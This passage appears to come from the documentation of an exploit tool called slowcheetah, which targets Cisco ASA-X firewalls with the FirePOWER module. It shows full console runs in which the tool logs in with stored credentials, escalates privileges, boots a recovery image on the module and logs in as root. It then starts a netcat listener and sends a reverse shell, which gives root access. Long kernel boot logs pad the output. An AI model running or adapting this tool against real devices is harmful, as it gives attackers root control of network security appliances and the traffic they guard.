Mod-sfr 303> t support DPO or FUA
Mod-sfr 304> [    7.747292]  sda: unknown partition table
Mod-sfr 305> [    7.753103] sd 0:0:0:0: [sda] Attached SCSI disk
Mod-sfr 306> [    7.756557] sd 0:0:0:0: Attached scsi generic sg0 type 0
Mod-sfr 307> [    7.761953] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     1.5. PQ: 
Mod-sfr 308> 0 ANSI: 5
Mod-sfr 309> [    7.768697] sr0: scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
Mod-sfr 310> [    7.771804] Uniform CD-ROM driver Revision: 3.20
Mod-sfr 311> [    7.777312] sr 1:0:0:0: Attached scsi generic sg1 type 5
Mod-sfr 312> [    7.783324] Fusion MPT base driver 3.04.07
Mod-sfr 313> [    7.785452] Copyright (c) 1999-2008 LSI Corporation
Mod-sfr 314> [    7.787958] Fusion MPT SPI Host driver 3.04.07
Mod-sfr 315> [    7.790892] Fusion MPT FC Host driver 3.04.07
Mod-sfr 316> [    7.793833] Fusion MPT SAS Host driver 3.04.07
Mod-sfr 317> [    7.798691] ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
Mod-sfr 318> [    7.802995] ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
Mod-sfr 319> [    7.806727] uhci_hcd: USB Universal Host Controller Interface driver
Mod-sfr 320> [    7.811045] usbcore: registered new interface driver usblp
Mod-sfr 321> [    7.813840] Initializing USB Mass Storage driver...
Mod-sfr 322> [    7.816987] usbcore: registered new interface driver usb-storage
Mod-sfr 323> [    7.820042] USB Mass Storage support registered.
Mod-sfr 324> [    7.823154] usbcore: registered new interface driver libusual
Mod-sfr 325> [    7.827310] PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,1
Mod-sfr 326> [    7.834439] serio: i8042 KBD port at 0x60,0x64 irq 1
Mod-sfr 327> [    7.836993] serio: i8042 AUX port at 0x60,0x64 irq 12
Mod-sfr 328> [    7.847102] mice: PS/2 mouse device common for all mice
Mod-sfr 329> [    7.855896] rtc_cmos 00:01: RTC can wake from S4
Mod-sfr 330> [    7.858591] rtc_cmos 00:01: rtc core: registered rtc_cmos as rtc0
Mod-sfr 331> [    7.861700] rtc0: alarms up to one day, 114 bytes nvram, hpet irqs
Mod-sfr 332> [    7.865738] input: AT Translated Set 2 keyboard as /devices/platform/i8042/seri
Mod-sfr 333> o0/input/input1
Mod-sfr 334> [    7.865890] i2c /dev entries driver
Mod-sfr 335> [    7.867784] md: raid1 personality registered for level 1
Mod-sfr 336> [    7.876148] device-mapper: ioctl: 4.14.0-ioctl (2008-04-23) initialised: dm-dev
Mod-sfr 337> el@redhat.com
Mod-sfr 338> [    7.880021] cpuidle: using governor ladder
Mod-sfr 339> [    7.882178] cpuidle: using governor menu
Mod-sfr 340> [    7.884235] No iBFT detected.
Mod-sfr 341> [    7.903118] usbcore: registered new interface driver hiddev
Mod-sfr 342> [    7.907186] usbcore: registered new interface driver usbhid
Mod-sfr 343> [    7.909562] usbhid: v2.6:USB HID core driver
Mod-sfr 344> [    7.913138] ACPI: PCI Interrupt Link [LNKD] enabled at IRQ 11
Mod-sfr 345> [    7.915934] virtio-pci 0000:00:04.0: PCI INT A -> Link[LNKD] -> GSI 11 (level, 
Mod-sfr 346> high) -> IRQ 11
Mod-sfr 347> [    7.922448] ACPI: PCI Interrupt Link [LNKA] enabled at IRQ 10
Mod-sfr 348> [    7.925992] virtio-pci 0000:00:05.0: PCI INT A -> Link[LNKA] -> GSI 10 (level, 
Mod-sfr 349> high) -> IRQ 10
Mod-sfr 350> [    7.932635] ACPI: PCI Interrupt Link [LNKC] enabled at IRQ 11
Mod-sfr 351> [    7.935952] virtio-pci 0000:00:07.0: PCI INT A -> Link[LNKC] -> GSI 11 (level, 
Mod-sfr 352> high) -> IRQ 11
Mod-sfr 353> [    7.942609]  vda: vda1
Mod-sfr 354> [    7.951429] Advanced Linux Sound Architecture Driver Version 1.0.18rc3.
Mod-sfr 355> [    7.960433] ALSA device list:
Mod-sfr 356> [    7.962021]   No soundcards found.
Mod-sfr 357> [    7.964838] Netfilter messages via NETLINK v0.30.
Mod-sfr 358> [    7.966587] nf_conntrack version 0.5.0 (16384 buckets, 65536 max)
Mod-sfr 359> [    7.970620] ctnetlink v0.93: registering with nfnetlink.
Mod-sfr 360> [    7.973425] IPv4 over IPv4 tunneling driver
Mod-sfr 361> [    7.977426] ip_tables: (C) 2000-2006 Netfilter Core Team
Mod-sfr 362> [    7.980633] TCP cubic registered
Mod-sfr 363> [    7.982429] Initializing XFRM netlink socket
Mod-sfr 364> [    7.985436] NET: Registered protocol family 10
Mod-sfr 365> [    7.989426] lo: Disabled Privacy Extensions
Mod-sfr 366> [    7.993425] tunl0: Disabled Privacy Extensions
Mod-sfr 367> [    7.997423] ip6_tables: (C) 2000-2006 Netfilter Core Team
Mod-sfr 368> [    8.001044] IPv6 over IPv4 tunneling driver
Mod-sfr 369> [    8.003425] sit0: Disabled Privacy Extensions
Mod-sfr 370> [    8.006431] NET: Registered protocol family 17
Mod-sfr 371> [    8.011440] RPC: Registered udp transport module.
Mod-sfr 372> [    8.013984] RPC: Registered tcp transport module.
Mod-sfr 373> [    8.018282] registered taskstats version 1
Mod-sfr 374> [    8.129250] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/s
Mod-sfr 375> erio1/input/input2
Mod-sfr 376> [    9.530183] Sending DHCP and RARP requests ., OK
Mod-sfr 377> [   10.137495] IP-Config: Got DHCP answer from 0.0.0.0, my address is 192.168.1.6
Mod-sfr 378> [   10.148443] IP-Config: Complete:
Mod-sfr 379> [   10.150450]      device=eth1, addr=192.168.1.6, mask=255.255.255.0, gw=192.168.
Mod-sfr 380> 1.1,
Mod-sfr 381> [   10.154877]      host=192.168.1.6, domain=, nis-domain=(none),
Mod-sfr 382> [   10.157850]      bootserver=0.0.0.0, rootserver=0.0.0.0, rootpath=
Mod-sfr 383> [   10.161580] Freeing unused kernel memory: 544k freed
Mod-sfr 384> INIT: version 2.86 booting
Mod-sfr 385> [   10.415150] udevd version 124 started
Mod-sfr 386> Please wait: booting...
Mod-sfr 387> mount: sysfs already mounted or /sys busy
Mod-sfr 388> mount: according to mtab, sysfs is already mounted on /sys
Mod-sfr 389> Starting udev [   10.907093] udev: renamed network interface eth0 to cplane
Mod-sfr 390> [   10.910483] end_request: I/O error, dev fd0, sector 0
Mod-sfr 391> [   10.935429] udev: renamed network interface eth1 to eth0
Mod-sfr 392> [   11.503449] end_request: I/O error, dev fd0, sector 0
Mod-sfr 393> INIT: Entering runlevel: 5
Mod-sfr 394> 
Cisco FirePOWER Services Boot Image
[+] Attempting to drop to the SFR console
 5.4.1
session sfr console
Opening console session with module sfr.
Connected to module sfr. Escape character sequence is 'CTRL-^X'.


asasfr login: 
[+] Authenticating to the SFR terminal...
.. snip ..
Please review the final configuration:
Hostname:		asasfr
Management Interface Configuration

IPv4 Configuration:	dhcp

IPv6 Configuration:	Stateless autoconfiguration
NTP configuration: 	Disabled

CAUTION:
You have selected DHCP. The system will stop functioning correctly if DHCP
changes the assigned address due to lease expiration or other reasons.
We suggest you use static addressing instead.

CAUTION:
You have selected IPv6 stateless autoconfiguration, which assigns a global address
based on network prefix and a device identifier. Although this address is unlikely
tchange, if it does change, the system will stop functioning correctly.
We suggest you use static addressing instead.

Apply the changes?(y,n) [Y]: y
Configuration saved successfully!
Applying...
Restarting network services...
Done.
Press ENTER to continue...
[+] Logging out...

asasfr-boot><paramiko.Channel 0 (open) window=7976 -> <paramiko.Transport at 0xfe40a6d0 (cipher aes128-ctr, 128 bits) (active; 1 open channel(s))>>
exit
.. snip ..
Cisco FirePOWER Services Boot Image 5.4.1

asasfr login: root
Password: 
root@<paramiko.Channel 0 (open) window=7962 -> <paramiko.Transport at 0xfe40a6d0 (cipher aes128-ctr, 128 bits) (active; 1 open channel(s))>>
[+] Executing netcat listener
[+] Using /usr/bin/nc
Listening on 0.0.0.0 1270

[+] Sending reverse shell
Connection received on 10.12.70.253 55577
id
uid=0(root) gid=0(root)
uname -a
Linux asasfr 2.6.28.10.x86-target-64 #1 SMP PREEMPT Mon Feb 2 00:15:14 EST 2015 x86_64 GNU/Linux
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:FC:BA:44:54:31  
          inet addr:192.168.1.5  Bcast:0.0.0.0  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:26 errors:0 dropped:0 overruns:0 frame:0
          TX packets:22 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2697 (2.6 KiB)  TX bytes:3741 (3.6 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.255.255.255
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)


```

### Using an already uploaded image and achieving a shell

It could be that you want to use a boot image already on `disk0`. No problem! Just use `--image-path`:

```
albinolobster@ubuntu:~/slowcheetah$ python3 slowcheetah.py --rhost 10.12.70.253 --lhost 10.12.70.252 --username albinolobster --password labpass1 --image_path disk0:/asasfr-5500x-boot-6.2.3-4.img --verbose

   _____ __                 ________              __        __
  / ___// /___ _      __   / ____/ /_  ___  ___  / /_____ _/ /_
  \__ \/ / __ \ | /| / /  / /   / __ \/ _ \/ _ \/ __/ __ `/ __ \
 ___/ / / /_/ / |/ |/ /  / /___/ / / /  __/  __/ /_/ /_/ / / / /
/____/_/\____/|__/|__/   \____/_/ /_/\___/\___/\__/\__,_/_/ /_/

   🦞 ASA-X with FirePOWER Service Boot Image Root Shell 🦞

[+] Authenticating to 10.12.70.253:22 as albinolobster:labpass1
User albinolobster logged in to ciscoasa
Logins over the last 1 days: 5.  Last login: 20:44:37 UTC Jun 29 2022 from 10.12.70.252
Failed logins since the last login: 0.  
Type help or '?' for a list of available commands.
ciscoasa> 
[+] Attempting to escalate to an enable prompt
en
Password: 
ciscoasa# 
[+] Attempting to start the provided boot image
show module sfr

Mod  Card Type                                    Model              Serial No. 
---- -------------------------------------------- ------------------ -----------
 sfr Unknown                                      N/A                JAD221400UD

Mod  MAC Address Range                 Hw Version   Fw Version   Sw Version     
---- --------------------------------- ------------ ------------ ---------------
 sfr 00fc.ba44.5431 to 00fc.ba44.5431  N/A          N/A          

Mod  SSM Application Name           Status           SSM Application Version
---- ------------------------------ ---------------- --------------------------
 sfr Unknown                        No Image Present Not Applicable

Mod  Status             Data Plane Status     Compatibility
---- ------------------ --------------------- -------------
 sfr Unresponsive       Not Applicable        

ciscoasa# 
[+] This may take a few minutes - Booting recover image: disk0:/asasfr-5500x-boot-6.2.3-4.img
sw-module module sfr recover configure image disk0:/asasfr-5500x-boo$
ciscoasa# debug module-boot
debug module-boot  enabled at level 1
ciscoasa# sw-module module sfr recover boot

Module sfr will be recovered. This may erase all configuration and all data
on that device and attempt to download/install a new image for it. This may take
several minutes.

Recover module sfr? [confirm]
Recover issued for module sfr.
ciscoasa# Mod-sfr 395> ***
Mod-sfr 396> *** EVENT: Creating the Disk Image...
Mod-sfr 397> *** TIME: 20:46:14 UTC Jun 29 2022
Mod-sfr 398> ***
Mod-sfr 399> ***
Mod-sfr 400> *** EVENT: The module is being recovered.
Mod-sfr 401> *** TIME: 20:46:14 UTC Jun 29 2022
Mod-sfr 402> ***
Mod-sfr 403> ***
Mod-sfr 404> *** EVENT: Disk Image created successfully.
Mod-sfr 405> *** TIME: 20:48:18 UTC Jun 29 2022
Mod-sfr 406> ***
Mod-sfr 407> ***
Mod-sfr 408> *** EVENT: Start Parameters: Image: /mnt/disk0/vm/vm_1.img, ISO: -cdrom /mnt/disk0
Mod-sfr 409> /asasfr-5500x-boot-6.2.3-4.img, Num CPUs: 3, RAM: 2249MB, Mgmt MAC: 00:FC:BA:44:54
Mod-sfr 410> :31, CP MAC: 00:00:00:02:00:01, HDD: -drive file=/dev/sda,cache=none,if=virtio, De
Mod-sfr 411> v D
Mod-sfr 412> ***
Mod-sfr 413> *** EVENT: Start Parameters Continued: RegEx Shared Mem: 0MB, Cmd Op: r, Shared Me
Mod-sfr 414> m Key: 8061, Shared Mem Size: 16, Log Pipe: /dev/ttyS0_vm1, Sock: /dev/ttyS1_vm1, 
Mod-sfr 415> Mem-Path: -mem-path /hugepages
Mod-sfr 416> *** TIME: 20:48:18 UTC Jun 29 2022
Mod-sfr 417> ***
Mod-sfr 418> Mod-sfr 419> Warning: vlan 0 is not connected to host network
Mod-sfr 420> ISOLINUX 3.73 2009-01-25  Copyright (C) 1994-2008 H. Peter Anvin
Mod-sfr 421>                    Cisco SFR-BOOT-IMAGE and CX-BOOT-IMAGE for SFR - 6.2.3
Mod-sfr 422>     (WARNING: ALL DATA ON DISK 1 WILL BE LOST)
Mod-sfr 423> Loading bzImage.............................................................
Mod-sfr 424> Loading initramfs.gz..............................................................
Mod-sfr 425> ..................................................................................
Mod-sfr 426> ..................................................................................
Mod-sfr 427> ..................................................................................
Mod-sfr 428> ..................................................................................
Mod-sfr 429> ..................................................................................
Mod-sfr 430> ..................................................................................
Mod-sfr 431> ........................................ready.
Mod-sfr 432> [    0.000000] Initializing cgroup subsys cpuset
Mod-sfr 433> [    0.000000] Initializing cgroup subsys cpu
Mod-sfr 434> [    0.000000] Initializing cgroup subsys cpuacct
Mod-sfr 435> [    0.000000] Linux version 3.10.107sf.cisco-1 (build@1fd5cd658885) (gcc version 
Mod-sfr 436> 4.7.1 (GCC) ) #1 SMP PREEMPT Fri Nov 10 17:06:45 UTC 2017
Mod-sfr 437> [    0.000000] Command line: initrd=initramfs.gz console=ttyS0,9600 BOOT_IMAGE=bzI
Mod-sfr 438> mage 
Mod-sfr 439> [    0.000000] e820: BIOS-provided physical RAM map:
Mod-sfr 440> [    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
Mod-sfr 441> [    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
Mod-sfr 442> [    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
Mod-sfr 443> [    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000008c8fdfff] usable
Mod-sfr 444> [    0.000000] BIOS-e820: [mem 0x000000008c8fe000-0x000000008c8fffff] reserved
Mod-sfr 445> [    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
Mod-sfr 446> [    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
Mod-sfr 447> [    0.000000] NX (Execute Disable) protection: active
Mod-sfr 448> [    0.000000] SMBIOS 2.4 present.
Mod-sfr 449> [    0.000000] Hypervisor detected: KVM
Mod-sfr 450> [    0.000000] No AGP bridge found
Mod-sfr 451> [    0.000000] e820: last_pfn = 0x8c8fe max_arch_pfn = 0x400000000
Mod-sfr 452> [    0.000000] PAT not supported by CPU.
Mod-sfr 453> [    0.000000] found SMP MP-table at [mem 0x000fdac0-0x000fdacf] mapped at [ffff88
Mod-sfr 454> 00000fdac0]
Mod-sfr 455> [    0.000000] init_memory_mapping: [mem 0x00000000-0x000fffff]
Mod-sfr 456> [    0.000000] init_memory_mapping: [mem 0x8c600000-0x8c7fffff]
Mod-sfr 457> [    0.000000] init_memory_mapping: [mem 0x8c000000-0x8c5fffff]
Mod-sfr 458> [    0.000000] init_memory_mapping: [mem 0x80000000-0x8bffffff]
Mod-sfr 459> [    0.000000] init_memory_mapping: [mem 0x00100000-0x7fffffff]
Mod-sfr 460> [    0.000000] init_memory_mapping: [mem 0x8c800000-0x8c8fdfff]
Mod-sfr 461> [    0.000000] RAMDISK: [mem 0x7db0b000-0x7fffffff]
Mod-sfr 462> [    0.000000] ACPI: RSDP 0x00000000000FD900 00014 (v00 BOCHS )
Mod-sfr 463> [    0.000000] ACPI: RSDT 0x000000008C8FE3E0 00034 (v01 BOCHS  BXPCRSDT 00000001 B
Mod-sfr 464> XPC 00000001)
Mod-sfr 465> [    0.000000] ACPI: FACP 0x000000008C8FFF80 00074 (v01 BOCHS  BXPCFACP 00000001 B
Mod-sfr 466> XPC 00000001)
Mod-sfr 467> [    0.000000] ACPI: DSDT 0x000000008C8FE420 011A9 (v01 BXPC   BXDSDT   00000001 I
Mod-sfr 468> NTL 20100528)
Mod-sfr 469> [    0.000000] ACPI: FACS 0x000000008C8FFF40 00040
Mod-sfr 470> [    0.000000] ACPI: SSDT 0x000000008C8FF740 007F7 (v01 BOCHS  BXPCSSDT 00000001 B
Mod-sfr 471> XPC 00000001)
Mod-sfr 472> [    0.000000] ACPI: APIC 0x000000008C8FF610 00088 (v01 BOCHS  BXPCAPIC 00000001 B
Mod-sfr 473> XPC 00000001)
Mod-sfr 474> [    0.000000] ACPI: HPET 0x000000008C8FF5D0 00038 (v01 BOCHS  BXPCHPET 00000001 B
Mod-sfr 475> XPC 00000001)
Mod-sfr 476> [    0.000000] No NUMA configuration found
Mod-sfr 477> [    0.000000] Faking a node at [mem 0x0000000000000000-0x000000008c8fdfff]
Mod-sfr 478> [    0.000000] Initmem setup node 0 [mem 0x00000000-0x8c8fdfff]
Mod-sfr 479> [    0.000000]   NODE_DATA [mem 0x8c8fa000-0x8c8fdfff]
Mod-sfr 480> [    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
Mod-sfr 481> [    0.000000] kvm-clock: cpu 0, msr 0:8c8f9001, boot clock
Mod-sfr 482> [    0.000000] Zone ranges:
Mod-sfr 483> [    0.000000]   DMA      [mem 0x00001000-0x00ffffff]
Mod-sfr 484> [    0.000000]   DMA32    [mem 0x01000000-0xffffffff]
Mod-sfr 485> [    0.000000]   Normal   empty
Mod-sfr 486> [    0.000000] Movable zone start for each node
Mod-sfr 487> [    0.000000] Early memory node ranges
Mod-sfr 488> [    0.000000]   node   0: [mem 0x00001000-0x0009efff]
Mod-sfr 489> [    0.000000]   node   0: [mem 0x00100000-0x8c8fdfff]
Mod-sfr 490> [    0.000000] ACPI: PM-Timer IO Port: 0xb008
Mod-sfr 491> [    0.000000] ACPI: LAPIC (acpi_id[0x00] lapic_id[0x00] enabled)
Mod-sfr 492> [    0.000000] ACPI: LAPIC (acpi_id[0x01] lapic_id[0x01] enabled)
Mod-sfr 493> [    0.000000] ACPI: LAPIC (acpi_id[0x02] lapic_id[0x02] enabled)
Mod-sfr 494> [    0.000000] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
Mod-sfr 495> [    0.000000] ACPI: IOAPIC (id[0x00] address[0xfec00000] gsi_base[0])
Mod-sfr 496> [    0.000000] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
Mod-sfr 497> [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
Mod-sfr 498> [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
Mod-sfr 499> [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
Mod-sfr 500> [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
Mod-sfr 501> [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
Mod-sfr 502> [    0.000000] Using ACPI (MADT) for SMP configuration information
Mod-sfr 503> [    0.000000] ACPI: HPET id: 0x8086a201 base: 0xfed00000
Mod-sfr 504> [    0.000000] smpboot: Allowing 3 CPUs, 0 hotplug CPUs
Mod-sfr 505> [    0.000000] e820: [mem 0x8c900000-0xfeffbfff] available for PCI devices
Mod-sfr 506> [    0.000000] Booting paravirtualized kernel on KVM
Mod-sfr 507> [    0.000000] setup_percpu: NR_CPUS:64 nr_cpumask_bits:64 nr_cpu_ids:3 nr_node_id
Mod-sfr 508> s:1
Mod-sfr 509> [    0.000000] PERCPU: Embedded 24 pages/cpu @ffff88008c400000 s68672 r8192 d21440
Mod-sfr 510>  u524288
Mod-sfr 511> [    0.000000] kvm-clock: cpu 0, msr 0:8c8f9001, primary cpu clock
Mod-sfr 512> [    0.000000] KVM setup async PF for cpu 0
Mod-sfr 513> [    0.000000] kvm-stealtime: cpu 0, msr 8c40ba40
Mod-sfr 514> [    0.000000] Built 1 zonelists in Node order, mobility grouping on.  Total pages
Mod-sfr 515> : 567751
Mod-sfr 516> [    0.000000] Policy zone: DMA32
Mod-sfr 517> [    0.000000] Kernel command line: initrd=initramfs.gz console=ttyS0,9600 BOOT_IM
Mod-sfr 518> AGE=bzImage 
Mod-sfr 519> [    0.000000] PID hash table entries: 4096 (order: 3, 32768 bytes)
Mod-sfr 520> [    0.000000] Checking aperture...
Mod-sfr 521> [    0.000000] No AGP bridge found
Mod-sfr 522> [    0.000000] Memory: 2222688k/2302968k available (4805k kernel code, 392k absent
Mod-sfr 523> , 79888k reserved, 2414k data, 896k init)
Mod-sfr 524> [    0.000000] Preemptible hierarchical RCU implementation.
Mod-sfr 525> [    0.000000] 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=3.
Mod-sfr 526> [    0.000000] NR_IRQS:4352 nr_irqs:704 16
Mod-sfr 527> [    0.000000] Console: colour VGA+ 80x25
Mod-sfr 528> [    0.000000] console [ttyS0] enabled
Mod-sfr 529> [    0.000000] allocated 9437184 bytes of page_cgroup
Mod-sfr 530> [    0.000000] please try 'cgroup_disable=memory' option if you don't want memory 
Mod-sfr 531> cgroups
Mod-sfr 532> [    0.000000] tsc: Detected 1249.999 MHz processor
Mod-sfr 533> [    0.003000] Calibrating delay loop (skipped) preset value.. 2499.99 BogoMIPS (l
Mod-sfr 534> pj=1249999)
Mod-sfr 535> [    0.004019] pid_max: default: 32768 minimum: 301
Mod-sfr 536> [    0.005146] Security Framework initialized
Mod-sfr 537> [    0.008052] Dentry cache hash table entries: 524288 (order: 10, 4194304 bytes)
Mod-sfr 538> [    0.015036] Inode-cache hash table entries: 262144 (order: 9, 2097152 bytes)
Mod-sfr 539> [    0.018533] Mount-cache hash table entries: 256
Mod-sfr 540> [    0.019483] Initializing cgroup subsys memory
Mod-sfr 541> [    0.020275] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
Mod-sfr 542> [    0.020275] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0
Mod-sfr 543> [    0.020275] tlb_flushall_shift: 6
Mod-sfr 544> [    0.022390] Freeing SMP alternatives: 12k freed
Mod-sfr 545> [    0.027155] ACPI: Core revision 20130328
Mod-sfr 546> [    0.032706] ACPI: All ACPI Tables successfully acquired
Mod-sfr 547> [    0.040198] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
Mod-sfr 548> [    0.041010] smpboot: CPU0: Intel QEMU Virtual CPU version 1.5.0 (fam: 06, model
Mod-sfr 549> : 02, stepping: 03)
Mod-sfr 550> [    0.047000] Performance Events: unsupported p6 CPU model 2 no PMU driver, softw
Mod-sfr 551> are events only.
Mod-sfr 552> [    0.055297] smpboot: Booting Node   0, Processors  #1[    0.003000] kvm-clock: 
Mod-sfr 553> cpu 1, msr 0:8c8f9041, secondary cpu clock
Mod-sfr 554> [    0.072101] KVM setup async PF for cpu 1
Mod-sfr 555>  #2 OK
Mod-sfr 556> [    0.072101] kvm-stealtime: cpu 1, msr 8c48ba40
Mod-sfr 557> [    0.003000] kvm-clock: cpu 2, msr 0:8c8f9081, secondary cpu clock
Mod-sfr 558> [    0.091187] Brought up 3 CPUs
Mod-sfr 559> [    0.091089] KVM setup async PF for cpu 2
Mod-sfr 560> [    0.091089] kvm-stealtime: cpu 2, msr 8c50ba40
Mod-sfr 561> [    0.092013] smpboot: Total of 3 processors activated (7499.99 BogoMIPS)
Mod-sfr 562> [    0.096873] devtmpfs: initialized
Mod-sfr 563> [    0.100314] NET: Registered protocol family 16
Mod-sfr 564> [    0.104970] ACPI: bus type PCI registered
Mod-sfr 565> [    0.106590] PCI: Using configuration type 1 for base access
Mod-sfr 566> [    0.163524] bio: create slab <bio-0> at 0
Mod-sfr 567> [    0.167672] ACPI: Added _OSI(Module Device)
Mod-sfr 568> [    0.168020] ACPI: Added _OSI(Processor Device)
Mod-sfr 569> [    0.169000] ACPI: Added _OSI(3.0 _SCP Extensions)
Mod-sfr 570> [    0.169000] ACPI: Added _OSI(Processor Aggregator Device)
Mod-sfr 571> [    0.176929] ACPI: Interpreter enabled
Mod-sfr 572> [    0.179027] ACPI: (supports S0 S5)
Mod-sfr 573> [    0.181008] ACPI: Using IOAPIC for interrupt routing
Mod-sfr 574> [    0.183756] PCI: Using host bridge windows from ACPI; if necessary, use "pci=no
Mod-sfr 575> crs" and report a bug
Mod-sfr 576> [    0.188679] ACPI: No dock devices found.
Mod-sfr 577> [    0.215138] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
Mod-sfr 578> [    0.218025] acpi PNP0A03:00: ACPI _OSC support notification failed, disabling P
Mod-sfr 579> CIe ASPM
Mod-sfr 580> [    0.219000] acpi PNP0A03:00: Unable to request _OSC control (_OSC support mask:
Mod-sfr 581>  0x08)
Mod-sfr 582> [    0.225286] acpi PNP0A03:00: fail to add MMCONFIG information, can't access ext
Mod-sfr 583> ended PCI configuration space under this bridge.
Mod-sfr 584> [    0.231105] PCI host bridge to bus 0000:00
Mod-sfr 585> [    0.233016] pci_bus 0000:00: root bus resource [bus 00-ff]
Mod-sfr 586> [    0.234000] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7]
Mod-sfr 587> [    0.234000] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff]
Mod-sfr 588> [    0.241014] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff]
Mod-sfr 589> [    0.244015] pci_bus 0000:00: root bus resource [mem 0xc0000000-0xfebfffff]
Mod-sfr 590> [    0.266230] pci 0000:00:01.3: quirk: [io  0xb000-0xb03f] claimed by PIIX4 ACPI
Mod-sfr 591> [    0.270051] pci 0000:00:01.3: quirk: [io  0xb100-0xb10f] claimed by PIIX4 SMB
Mod-sfr 592> [    0.428512] ACPI: PCI Interrupt Link [LNKA] (IRQs 5 *10 11)
Mod-sfr 593> [    0.432876] ACPI: PCI Interrupt Link [LNKB] (IRQs 5 *10 11)
Mod-sfr 594> [    0.436427] ACPI: PCI Interrupt Link [LNKC] (IRQs 5 10 *11)
Mod-sfr 595> [    0.438893] ACPI: PCI Interrupt Link [LNKD] (IRQs 5 10 *11)
Mod-sfr 596> [    0.442055] ACPI: PCI Interrupt Link [LNKS] (IRQs *9)
Mod-sfr 597> [    0.446996] ACPI: Enabled 16 GPEs in block 00 to 0F
Mod-sfr 598> [    0.450200] vgaarb: device added: PCI:0000:00:02.0,decodes=io+mem,owns=io+mem,l
Mod-sfr 599> ocks=none
Mod-sfr 600> [    0.454890] vgaarb: loaded
Mod-sfr 601> [    0.456010] vgaarb: bridge control possible 0000:00:02.0
Mod-sfr 602> [    0.460000] SCSI subsystem initialized
Mod-sfr 603> [    0.461013] ACPI: bus type ATA registered
Mod-sfr 604> [    0.465047] ACPI: bus type USB registered
Mod-sfr 605> [    0.467563] usbcore: registered new interface driver usbfs
Mod-sfr 606> [    0.471323] usbcore: registered new interface driver hub
Mod-sfr 607> [    0.473935] usbcore: registered new device driver usb
Mod-sfr 608> [    0.477135] pps_core: LinuxPPS API ver. 1 registered
Mod-sfr 609> [    0.480048] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giomett
Mod-sfr 610> i <giometti@linux.it>
Mod-sfr 611> [    0.484273] PTP clock support registered
Mod-sfr 612> [    0.487135] PCI: Using ACPI for IRQ routing
Mod-sfr 613> [    0.491121] NetLabel: Initializing
Mod-sfr 614> [    0.492010] NetLabel:  domain hash size = 128
Mod-sfr 615> [    0.493000] NetLabel:  protocols = UNLABELED CIPSOv4
Mod-sfr 616> [    0.497040] NetLabel:  unlabeled traffic allowed by default
Mod-sfr 617> [    0.498000] HPET: 3 timers in total, 0 timers will be used for per-cpu timer
Mod-sfr 618> [    0.498000] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
Mod-sfr 619> [    0.498000] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
Mod-sfr 620> [    0.513409] amd_nb: Cannot enumerate AMD northbridges
Mod-sfr 621> [    0.515013] Switching to clocksource kvm-clock
Mod-sfr 622> [    0.518517] pnp: PnP ACPI init
Mod-sfr 623> [    0.520001] ACPI: bus type PNP registered
Mod-sfr 624> [    0.525912] pnp: PnP ACPI: found 8 devices
Mod-sfr 625> [    0.527886] ACPI: bus type PNP unregistered
Mod-sfr 626> [    0.562358] NET: Registered protocol family 2
Mod-sfr 627> [    0.565543] TCP established hash table entries: 32768 (order: 7, 524288 bytes)
Mod-sfr 628> [    0.569316] TCP bind hash table entries: 32768 (order: 7, 524288 bytes)
Mod-sfr 629> [    0.572625] TCP: Hash tables configured (established 32768 bind 32768)
Mod-sfr 630> [    0.575726] TCP: reno registered
Mod-sfr 631> [    0.577322] UDP hash table entries: 2048 (order: 4, 65536 bytes)
Mod-sfr 632> [    0.580156] UDP-Lite hash table entries: 2048 (order: 4, 65536 bytes)
Mod-sfr 633> [    0.583484] NET: Registered protocol family 1
Mod-sfr 634> [    0.586087] RPC: Registered named UNIX socket transport module.
Mod-sfr 635> [    0.588849] RPC: Registered udp transport module.
Mod-sfr 636> [    0.591072] RPC: Registered tcp transport module.
Mod-sfr 637> [    0.593266] RPC: Registered tcp NFSv4.1 backchannel transport module.
